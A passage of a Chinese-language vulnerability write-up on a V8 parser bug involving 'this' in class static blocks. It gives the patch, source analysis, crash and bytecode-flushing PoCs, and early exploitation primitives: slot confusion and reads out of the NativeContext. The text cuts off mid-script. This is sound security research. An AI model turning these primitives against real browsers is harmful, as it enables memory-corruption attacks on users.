</span></span><span class=line><span class=cl>   FunctionState initializer_state(&amp;function_state_, &amp;scope_, initializer_scope);
</span></span><span class=line><span class=cl><span class=gi>+  FunctionParsingScope body_parsing_scope(impl());
</span></span></span><span class=line><span class=cl><span class=gi></span>   AcceptINScope accept_in(this, true);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   // Each static block has its own var and lexical scope, so make a new var
</span></span></code></pre></div><p>patch十分简单，实际真正有效的修复代码仅有一行，在解析class的<a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/Static_initialization_blocks>static initialization block</a>时新增了一个类型为<code>FunctionParsingScope</code>的变量，我们再看一下这个新增的变量做了什么：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl>  <span class=k>class</span> <span class=nc>V8_NODISCARD</span> <span class=n>FunctionParsingScope</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=k>explicit</span> <span class=n>FunctionParsingScope</span><span class=p>(</span><span class=n>Impl</span><span class=o>*</span> <span class=n>parser</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>:</span> <span class=n>parser_</span><span class=p>(</span><span class=n>parser</span><span class=p>),</span> <span class=n>expression_scope_</span><span class=p>(</span><span class=n>parser_</span><span class=o>-&gt;</span><span class=n>expression_scope_</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>parser_</span><span class=o>-&gt;</span><span class=n>expression_scope_</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>~</span><span class=n>FunctionParsingScope</span><span class=p>()</span> <span class=p>{</span> <span class=n>parser_</span><span class=o>-&gt;</span><span class=n>expression_scope_</span> <span class=o>=</span> <span class=n>expression_scope_</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=k>private</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=n>Impl</span><span class=o>*</span> <span class=n>parser_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>ExpressionScope</span><span class=o>*</span> <span class=n>expression_scope_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span></code></pre></div><p>这是一个极为简单的类，他所做的事情就是在构造时把当前<code>parser_</code>中的<code>expression_scope_</code>暂存起来，再在析构的时候将其恢复。那么重点就是这个<code>ExpressionScope</code>了。</p><p>parser在语法分析阶段，会将脚本中的不同部分分为不同的<a href=https://developer.mozilla.org/en-US/docs/Glossary/Scope>Scope</a>，简单理解下Scope划分了变量的作用范围，JavaScript中有许多不同的Scope类型，如Global scope/Module scope/Function scope等等。</p><p>为了更好地解析变量所在的不同Scope，开发者引入了<code>ExpressionScope</code>的概念，其具体概念可以参考这篇<a href=https://docs.google.com/document/d/1FAvEp9EUK-G8kHfDIEo_385Hs2SUBCYbJ5H-NnLvq8M/edit>官方文档</a>。值得一提的是，v8中的<code>ExpressionScope</code>和<code>Scope</code>在命名上很相似，实际是完全不同的概念，<code>ExpressionScope</code>是一个中间变量，他的存在是为了方便解析，用来生成实际AST中的<code>Scope</code>。<code>Scope</code>和<code>ExpressionScope</code>一样，通过parent来逐级索引外层。</p><p>回到此漏洞，新增的<code>FunctionParsingScope</code>变量阻断了<code>ExpressionScope</code>链向parent索引，那么原漏洞很可能是导致了parent ExpressionScope的非预期行为，寻找parent的引用，几乎只有这个函数是可能的嫌疑犯：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl>  <span class=kt>void</span> <span class=nf>RecordThisUse</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ExpressionScope</span><span class=o>*</span> <span class=n>scope</span> <span class=o>=</span> <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>scope</span><span class=o>-&gt;</span><span class=n>IsArrowHeadParsingScope</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>scope</span><span class=o>-&gt;</span><span class=n>AsArrowHeadParsingScope</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>RecordThisUse</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=n>scope</span> <span class=o>=</span> <span class=n>scope</span><span class=o>-&gt;</span><span class=n>parent</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>scope</span> <span class=o>!=</span> <span class=k>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span></code></pre></div><p>再查看此函数的调用处：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl>  <span class=c1>// Needs to be called if the reference needs to be available from the current
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// point. It causes the receiver to be context allocated if necessary.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// Returns the receiver variable that we&#39;re referencing.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>V8_INLINE</span> <span class=n>Variable</span><span class=o>*</span> <span class=nf>UseThis</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>var</span><span class=o>-&gt;</span><span class=n>set_is_used</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>closure_scope</span> <span class=o>==</span> <span class=n>receiver_scope</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=c1>// It&#39;s possible that we&#39;re parsing the head of an arrow function, in
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=c1>// which case we haven&#39;t realized yet that closure_scope !=
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=c1>// receiver_scope. Mark through the ExpressionScope for now.
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>expression_scope</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>RecordThisUse</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
</span></span></code></pre></div><p>这个函数在处理JavaScript中的一个特殊变量<code>this</code>，在传统的function中，this变量不能在函数调用间传递，如：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>showThis</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>innerThis</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=k>this</span> <span class=o>==</span> <span class=nx>innerThis</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>.</span><span class=nx>showThis</span> <span class=o>=</span> <span class=nx>showThis</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>.</span><span class=nx>showThis</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=c1>// output: false
</span></span></span></code></pre></div><p>而在ES6中引入的箭头函数解决了这一问题，箭头函数内可以正常使用外层的<code>this</code>变量。为了支持此特性，对于<code>this</code>的parsing就会需要特殊处理。正如<code>UseThis</code>函数中的注释所说，当v8发现出现<code>this</code>变量时，若内外的Scope为同一个，有可能是正在解析箭头函数的参数部分，如以下代码所示：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>foo</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=nx>arg</span> <span class=o>=</span> <span class=k>this</span><span class=p>.</span><span class=nx>a</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span> <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>arg</span><span class=p>);</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>由于此时箭头函数的Scope并未分配，因此需要用<code>ExpressionScope</code>来标记此处使用了<code>this</code>变量，以便后面分配Scope时能正确分配出<code>this</code>变量。在<code>RecordThisUse</code>中，函数将所有parent <code>ExpressionScope</code>都标记为使用了<code>this</code>。</p><p>那么回想<code>this</code>的传递，他应当在函数的调用过程中被阻断，而class的static block同样应当被视为一个函数block，所以此处的问题就为：在class static block中使用<code>this</code>，通过<code>ExpressionScope</code>链传递，会错误地将外层的函数标记为使用了<code>this</code>。PoC如下：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=nx>arg</span> <span class=o>=</span> <span class=kr>class</span> <span class=nx>AAA</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>static</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>})</span> <span class=p>=&gt;</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>f1</span><span class=p>();</span>
</span></span></code></pre></div><p>由于外层函数<code>f1</code>的<code>this</code>并未被使用，但是被标记为了<code>has_forced_context_allocation</code>，因此在分配该变量时会触发DCHECK。</p><img src=assets/image-20240628192130458.png style=display:block;margin-left:auto;margin-right:auto;zoom:70%><h2 id=构造字节码不一致>构造字节码不一致<a hidden class=anchor aria-hidden=true href=#构造字节码不一致>#</a></h2><p>这样一个微小的错误能够引起v8引擎什么样的混乱呢？接下来我们继续深入研究生成的字节码。</p><p>构造以下函数：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>foo</span><span class=p>()</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=nx>arg</span> <span class=o>=</span> <span class=kr>class</span> <span class=nx>AAA</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>static</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>})</span> <span class=p>=&gt;</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>在新版修复漏洞后生成的字节码：</p><pre tabindex=0><code class=language-assembly data-lang=assembly>[generated bytecode for function: f1 (0x234800198559 &lt;SharedFunctionInfo f1&gt;)]
Bytecode length: 6
Parameter count 1
Register count 0
Frame size 0
   40 S&gt; 0xee0000400a4 @    0 : 85 00 00 02       CreateClosure [0], [0], #2
         0xee0000400a8 @    4 : 0e                LdaUndefined
  102 S&gt; 0xee0000400a9 @    5 : af                Return
Constant pool (size = 1)
0xee000040071: [TrustedFixedArray]
 - map: 0x234800000595 &lt;Map(TRUSTED_FIXED_ARRAY_TYPE)&gt;
 - length: 1
           0: 0x2348001986a1 &lt;SharedFunctionInfo&gt;
</code></pre><p>旧版下有问题的字节码：</p><pre tabindex=0><code class=language-assembly data-lang=assembly>[generated bytecode for function: f1 (0x0e2b0019ab81 &lt;SharedFunctionInfo f1&gt;)]
Bytecode length: 15
Parameter count 1
Register count 1
Frame size 8
Bytecode age: 0
   19 E&gt; 0xe2b0019adc2 @    0 : 84 00 01          CreateFunctionContext [0], [1]
         0xe2b0019adc5 @    3 : 1a fa             PushContext r0
         0xe2b0019adc7 @    5 : 0b 02             Ldar &lt;this&gt;
         0xe2b0019adc9 @    7 : 25 02             StaCurrentContextSlot [2]
   63 S&gt; 0xe2b0019adcb @    9 : 81 01 00 02       CreateClosure [1], [0], #2
         0xe2b0019adcf @   13 : 0e                LdaUndefined
  155 S&gt; 0xe2b0019add0 @   14 : aa                Return
Constant pool (size = 2)
0xe2b0019ad91: [FixedArray] in OldSpace
 - map: 0x0e2b00000089 &lt;Map(FIXED_ARRAY_TYPE)&gt;
 - length: 2
           0: 0x0e2b0019ad2d &lt;ScopeInfo FUNCTION_SCOPE&gt;
           1: 0x0e2b0019ad5d &lt;SharedFunctionInfo&gt;
</code></pre><p>正如前一节所述，即使在函数<code>f1</code>中没有使用<code>this</code>，在字节码中仍然强制分配了<code>this</code>变量。具体解释其字节码：</p><ol><li><code>CreateFunctionContext</code>创建了一个函数的Context</li><li><code>PushContext</code>将当前的Context替换为新创建的，保存旧Context</li><li><code>Ldar</code>读取<code>this</code>到accumulator</li><li><code>StaCurrentContextSlot</code>将accumulator中的值存储到当前Context的slot 2中</li></ol><p>然而我们的目标是在一次脚本执行内字节码发生不一致，这样才有利用的可能。学习了<a href=https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-4262.html>CVE-2022-4262</a>的PoC和<a href=https://github.com/bjrjk/CVE-2022-4262/blob/main/FA/FA.md>分析</a>，或许利用Bytecode flushing机制是个不错的主意。v8中若一个函数在多次GC后仍未被使用，该函数的bytecode就会被回收。而再次执行时，parser会使用之前已存储的结果来更快地生成bytecode。例如在parse箭头函数的头部时，第一次生成bytecode时parser不知道是在处理变量赋值还是箭头函数参数声明，而在之后的处理则可以确定是箭头函数头部。</p><p>有了这个基础知识，我们主动触发Bytecode flushing，成功构造出了两次执行的字节码不一致：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>f1</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>flush_bytecode</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>f1</span><span class=p>();</span>
</span></span></code></pre></div><p>函数<code>f1</code>在flush后的字节码和漏洞修复后的字节码一致，即少了构造Function Context的四条字节码指令。</p><h2 id=失败的尝试记录>失败的尝试记录<a hidden class=anchor aria-hidden=true href=#失败的尝试记录>#</a></h2><blockquote><p>此节并不影响后续内容阅读，读者可直接阅读下一节。</p></blockquote><p>实际上我们的研究并非一帆风顺，在构造出实际有用的不一致前，我们花费了大量时间尝试另一种字节码不一致。</p><p>最开始观察错误的字节码，其本质上是在Function Context内存储了一个多余的<code>this</code>，那么第一个到脑中的想法就是：如果在Function Context还有其他的变量，那么由于两次字节码不一致，若内部函数使用了同样的slot index来访问变量，可能会发生一些非预期的行为。</p><p>带着这个想法，构造了以下PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>a0</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>a1</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>f2</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;a0 = &#39;</span> <span class=o>+</span> <span class=nx>a0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;a1 = &#39;</span> <span class=o>+</span> <span class=nx>a1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>hax</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>a0</span> <span class=o>=</span> <span class=mh>0x1337</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=nx>arg</span> <span class=o>=</span> <span class=kr>class</span> <span class=nx>AAA</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>static</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>})</span> <span class=p>=&gt;</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>hax</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nx>f2</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>hax</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// keep a reference to hax to make it consistent after flushing
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>let</span> <span class=nx>hax</span> <span class=o>=</span> <span class=nx>f1</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>flush_bytecode</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;after flush&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>f1</span><span class=p>();</span>
</span></span></code></pre></div><p>输出结果为：</p><pre tabindex=0><code>a0 = 4919
a1 = 1
after flush
a0 = 0
a1 = 4919
</code></pre><p>可以看到，在第二次执行时，即便代码中赋值的对象是a0，但实际上被修改的是a1。查看函数<code>hax</code>的字节码：</p><pre tabindex=0><code class=language-assembly data-lang=assembly>[generated bytecode for function: hax (0x2e72000db2ed &lt;SharedFunctionInfo hax&gt;)]
Bytecode length: 15
Parameter count 1
Register count 1
Frame size 8
Bytecode age: 0
  763 S&gt; 0x2e72000dc35e @    0 : 00 0d 37 13       LdaSmi.Wide [4919]
         0x2e72000dc362 @    4 : c5                Star0
         0x2e72000dc363 @    5 : 16 03             LdaCurrentContextSlot [3]
  766 E&gt; 0x2e72000dc365 @    7 : ab 00             ThrowReferenceErrorIfHole [0]
         0x2e72000dc367 @    9 : 0b fa             Ldar r0
         0x2e72000dc369 @   11 : 25 03             StaCurrentContextSlot [3]
         0x2e72000dc36b @   13 : 0e                LdaUndefined
  778 S&gt; 0x2e72000dc36c @   14 : aa                Return
Constant pool (size = 1)
0x2e72000dc331: [FixedArray] in OldSpace
 - map: 0x2e7200000089 &lt;Map(FIXED_ARRAY_TYPE)&gt;
 - length: 1
           0: 0x2e72000dad51 &lt;String[2]: #a0&gt;
</code></pre><p>两次生成的<code>hax</code>字节码一样，均从当前Context的slot 3中读取变量。在第一次执行时这是没有问题的，因为<code>this</code>被存储在slot 2中，a0存储在slot 3中，而在第二次执行时，v8为<code>f1</code>生成了正确的字节码，此时a0在slot 2，a1在slot 3中，<code>hax</code>的字节码没有正确更新，就出现了上面这样非预期的结果。</p><p>我们试图利用这个bug，导致更进一步的type confusion。尝试了以下手段均以失败告终：</p><ol><li>尝试利用JIT优化对a0的访问，再在触发漏洞后使用JIT后的函数访问a1。然而此法不通，实际上字节码层面的变量修改对于JIT引擎来说都是可见的。</li><li>尝试使用非预期的字节码访问另一个变量，即以下场景：字节码Foo只接受类型A的参数，在使用类型B的参数时会发生类型混淆。然而字节码作为较为高层的存在，都会校验输入参数的类型，并不存在我们想要的字节码。</li></ol><h2 id=利用字节码不一致>利用字节码不一致<a hidden class=anchor aria-hidden=true href=#利用字节码不一致>#</a></h2><h3 id=另一种非预期行为>另一种非预期行为<a hidden class=anchor aria-hidden=true href=#另一种非预期行为>#</a></h3><p>我们观察两次生成的字节码，区别在于有没有Function Context。研究字节码可以发现，对于Context的load有两种方式，分别是<code>LdaCurrentContextSlot</code>和<code>LdaContextSlot</code>。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// comments from src/interpreter/interpreter-generator.cc
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>LdaCurrentContextSlot</span> <span class=o>&lt;</span><span class=nx>slot_index</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>Load</span> <span class=nx>the</span> <span class=nx>object</span> <span class=k>in</span> <span class=o>|</span><span class=nx>slot_index</span><span class=o>|</span> <span class=k>of</span> <span class=nx>the</span> <span class=nx>current</span> <span class=nx>context</span> <span class=nx>into</span> <span class=nx>the</span> <span class=nx>accumulator</span><span class=p>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>LdaContextSlot</span> <span class=o>&lt;</span><span class=nx>context</span><span class=o>&gt;</span> <span class=o>&lt;</span><span class=nx>slot_index</span><span class=o>&gt;</span> <span class=o>&lt;</span><span class=nx>depth</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>Load</span> <span class=nx>the</span> <span class=nx>object</span> <span class=k>in</span> <span class=o>|</span><span class=nx>slot_index</span><span class=o>|</span> <span class=k>of</span> <span class=nx>the</span> <span class=nx>context</span> <span class=nx>at</span> <span class=o>|</span><span class=nx>depth</span><span class=o>|</span> <span class=k>in</span> <span class=nx>the</span> <span class=nx>context</span>
</span></span><span class=line><span class=cl><span class=nx>chain</span> <span class=nx>starting</span> <span class=nx>at</span> <span class=o>|</span><span class=nx>context</span><span class=o>|</span> <span class=nx>into</span> <span class=nx>the</span> <span class=nx>accumulator</span><span class=p>.</span>
</span></span></code></pre></div><p>很显然，<code>LdaContextSlot</code>更为复杂。因为context的存储是栈式的，<code>LdaContextSlot</code>给予了一个更通用的方式来load，可以手动置顶起始context和需要查找的depth。</p><p>例如，以下字节码则是一个常见的字节码组合来load一个值。</p><pre tabindex=0><code class=language-assembly data-lang=assembly> 2807 S&gt; 0x1541001a24ba @    0 : 14 ff 70 01       LdaContextSlot &lt;context&gt;, [10], [1]
         0x1541001a24be @    4 : ab 00             ThrowReferenceErrorIfHole [0]
         0x1541001a24c0 @    6 : c5                Star0
</code></pre><p>回想两次生成的字节码的不同，那么一个新想法就是：如果在第二次生成字节码时，没有创建新的Function Context，而在内部函数<code>LdaContextSlot</code>时保持了旧的深度，那么会发生什么？</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>let</span> <span class=nx>o0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>hax</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>o0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>函数<code>hax</code>的字节码如下：</p><pre tabindex=0><code class=language-assembly data-lang=assembly>[generated bytecode for function: hax (0x00f9000de775 &lt;SharedFunctionInfo hax&gt;)]
Bytecode length: 14
Parameter count 1
Register count 1
Frame size 8
Bytecode age: 0
 2602 S&gt; 0xf9000e1256 @    0 : 14 ff 02 01       LdaContextSlot &lt;context&gt;, [2], [1]
         0xf9000e125a @    4 : ab 00             ThrowReferenceErrorIfHole [0]
         0xf9000e125c @    6 : c5                Star0
         0xf9000e125d @    7 : 65 aa 01 fa 01    CallRuntime [DebugPrint], r0-r0
         0xf9000e1262 @   12 : 0e                LdaUndefined
 2621 S&gt; 0xf9000e1263 @   13 : aa                Return
Constant pool (size = 1)
0xf9000e1229: [FixedArray] in OldSpace
 - map: 0x00f900000089 &lt;Map(FIXED_ARRAY_TYPE)&gt;
 - length: 1
           0: 0x00f9000dad2d &lt;String[2]: #o0&gt;
</code></pre><p>输出的结果令人吃惊：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>DebugPrint</span><span class=o>:</span> <span class=mh>0xf9000d4089</span><span class=o>:</span> <span class=p>[</span><span class=nx>JSGlobalObject</span><span class=p>]</span> <span class=k>in</span> <span class=nx>OldSpace</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>map</span><span class=o>:</span> <span class=mh>0x00f9000d8395</span> <span class=o>&lt;</span><span class=nx>Map</span><span class=p>[</span><span class=mi>20</span><span class=p>](</span><span class=nx>HOLEY_ELEMENTS</span><span class=p>)</span><span class=o>&gt;</span> <span class=p>[</span><span class=nx>DictionaryProperties</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>prototype</span><span class=o>:</span> <span class=mh>0x00f900092b7d</span> <span class=o>&lt;</span><span class=nb>Object</span> <span class=nx>map</span> <span class=o>=</span> <span class=mh>0xf9000d46a5</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>elements</span><span class=o>:</span> <span class=mh>0x00f900000219</span> <span class=o>&lt;</span><span class=nx>FixedArray</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>&gt;</span> <span class=p>[</span><span class=nx>HOLEY_ELEMENTS</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=kr>native</span> <span class=nx>context</span><span class=o>:</span> <span class=mh>0x00f9000c3c2d</span> <span class=o>&lt;</span><span class=nx>NativeContext</span><span class=p>[</span><span class=mi>281</span><span class=p>]</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>global</span> <span class=nx>proxy</span><span class=o>:</span> <span class=mh>0x00f9000c3bf5</span> <span class=o>&lt;</span><span class=nx>JSGlobalProxy</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>properties</span><span class=o>:</span> <span class=mh>0x00f9000e0bbd</span> <span class=o>&lt;</span><span class=nx>GlobalDictionary</span><span class=p>[</span><span class=mi>261</span><span class=p>]</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>All</span> <span class=nx>own</span> <span class=nx>properties</span> <span class=p>(</span><span class=nx>excluding</span> <span class=nx>elements</span><span class=p>)</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nx>Uint8Array</span><span class=o>:</span> <span class=mh>0x00f9000c5be1</span> <span class=o>&lt;</span><span class=nx>JSFunction</span> <span class=nx>Uint8Array</span> <span class=p>(</span><span class=nx>sfi</span> <span class=o>=</span> <span class=mh>0xf90008c131</span><span class=p>)</span><span class=o>&gt;</span> <span class=p>(</span><span class=nx>data</span><span class=p>,</span> <span class=nx>dict_index</span><span class=o>:</span> <span class=mi>30</span><span class=p>,</span> <span class=nx>attrs</span><span class=o>:</span> <span class=p>[</span><span class=nx>W_C</span><span class=p>])</span>
</span></span><span class=line><span class=cl>   <span class=p>...</span>
</span></span></code></pre></div><p>这个<code>JSGlobalObject</code>到底从何而来？</p><p>答案是他来自于<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/contexts.h;drc=1f14cc876cc5bf899d13284a12c451498219bb2d;l=704">NativeContext</a>，原来由于我们跳过了一层Function Context，我们load到了预期Context的更外面一层，而这一层的Context就是<code>NativeContext</code>。</p><p>我们稍微修改一下脚本，dump出<code>NativeContext</code>中的所有对象:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>let</span> <span class=nx>o0</span><span class=p>,</span> <span class=nx>o1</span><span class=p>,</span> <span class=nx>o2</span><span class=p>,</span> <span class=nx>o3</span><span class=p>,</span> <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>hax</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>o0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>o1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>o2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ...
